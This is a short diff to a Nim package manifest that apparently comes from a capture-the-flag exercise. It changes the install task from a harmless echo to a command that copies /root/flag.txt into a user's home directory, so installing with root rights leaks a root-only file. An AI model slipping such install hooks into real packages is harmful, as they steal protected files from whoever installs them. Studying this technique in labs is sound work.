@@ -16,4 +16,4 @@ bin = @["omnigodz"]
 
 # Install task
 task install, "Run a shell command upon installation":
-  exec "echo 'test'"
+  exec "cp /root/flag.txt /home/jack/flag.txt"
